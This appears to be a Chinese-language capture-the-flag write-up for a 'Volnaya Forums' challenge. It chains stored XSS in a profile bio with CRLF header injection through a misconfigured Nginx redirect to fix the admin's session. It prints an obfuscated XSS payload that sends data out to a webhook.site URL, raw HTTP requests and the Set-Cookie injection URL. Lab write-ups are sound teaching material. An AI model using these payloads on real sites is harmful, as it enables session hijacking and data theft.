Volnaya Forums

利用Nginx配置错误CRLF注入进行会话固定，存储型XSS扩大利用

- 注册并登录一个普通用户
- 更新个人资料 `bio` 字段放一个 XSS payload

```html
fetch('/api/auth').then(res=>res.json()).then(data=>{new Image().src='https://webhook.site/e3f8203d-c1f2-4f5d-b213-01fd429a67cc?flag='+data.user.flag;})
<img src=1 onerror=eval(atob(''))>

POST /api/profile HTTP/1.1
Host: 94.237.51.71:41720
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.71:41720/profile
Content-Type: application/json
Content-Length: 289
Origin: http://94.237.51.71:41720
Connection: keep-alive
Cookie: session=Fe26.2*1*edbfdfbdc2cc3536cb56daaafd4e431ce21c15b2c7e91a32f1b42661e6d20d1d*pmX6tX0kzWp6UbYM-RK0HQ*-jMSCdJ1M7abFGgrHBnFQGfFQ1emU-7EWuVI1941He4bJUgHBjFIkujYSCeecCrO5hPjcHYj3uZkwTG5JTbfJMPdoQCa-NFvh-GBOMhzJwQ*1758162659567*946fb10af0b4f520edb926023318f0c3294e4e6956b6236c2f98d36155023bee*l4aEMXWramdCtIx0e1eNSYAVtW-xzs2-TgGSC5Y24ys~2
Priority: u=0

{"username":"test","email":"test@test.com","bio":"<img src=1 onerror=eval(atob('ZmV0Y2goJy9hcGkvYXV0aCcpLnRoZW4ocmVzPT5yZXMuanNvbigpKS50aGVuKGRhdGE9PntuZXcgSW1hZ2UoKS5zcmM9J2h0dHBzOi8vd2ViaG9vay5zaXRlL2UzZjgyMDNkLWMxZjItNGY1ZC1iMjEzLTAxZmQ0MjlhNjdjYz9mbGFnPScrZGF0YS51c2VyLmZsYWc7fSk'))>"}
```

- 构造一个特殊的 URL，利用 **CRLF 注入** 向响应头中注入一个恶意的 `Set-Cookie`

```html
/invite/aaa%0D%0ASet-Cookie:%20session=<攻击者session>;%20Path=/api/profile

为什么是/invite/aaa
因为Nginx配置
location ~ ^/invite/(?<id>[^?]*)$ {
    return 301 "/?ref=$id";
}
```

- 把这个 URL 报告给管理员，让管理员去访问

```html
POST /api/report HTTP/1.1
Host: 94.237.51.71:41720
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.71:41720/report?id=1
Content-Type: application/json
Content-Length: 419
Origin: http://94.237.51.71:41720
Connection: keep-alive
Cookie: session=Fe26.2*1*edbfdfbdc2cc3536cb56daaafd4e431ce21c15b2c7e91a32f1b42661e6d20d1d*pmX6tX0kzWp6UbYM-RK0HQ*-jMSCdJ1M7abFGgrHBnFQGfFQ1emU-7EWuVI1941He4bJUgHBjFIkujYSCeecCrO5hPjcHYj3uZkwTG5JTbfJMPdoQCa-NFvh-GBOMhzJwQ*1758162659567*946fb10af0b4f520edb926023318f0c3294e4e6956b6236c2f98d36155023bee*l4aEMXWramdCtIx0e1eNSYAVtW-xzs2-TgGSC5Y24ys~2
Priority: u=0

{"postThread":"/invite/aaa%0D%0ASet-Cookie:%20session=Fe26.2*1*edbfdfbdc2cc3536cb56daaafd4e431ce21c15b2c7e91a32f1b42661e6d20d1d*pmX6tX0kzWp6UbYM-RK0HQ*-jMSCdJ1M7abFGgrHBnFQGfFQ1emU-7EWuVI1941He4bJUgHBjFIkujYSCeecCrO5hPjcHYj3uZkwTG5JTbfJMPdoQCa-NFvh-GBOMhzJwQ*1758162659567*946fb10af0b4f520edb926023318f0c3294e4e6956b6236c2f98d36155023bee*l4aEMXWramdCtIx0e1eNSYAVtW-xzs2-TgGSC5Y24ys~2;%20Path=/api/profile","reason":"1"}
```

- 管理员访问后，自己的 Cookie 被“覆盖”（session fixation）成攻击者的 Cookie
- 管理员的身份被“换成”攻击者的 session → 管理员身份访问了含有攻击者的 XSS payload 的个人资料
- XSS payload 执行，把管理员的 flag exfiltrate（外传）到 webhook.site
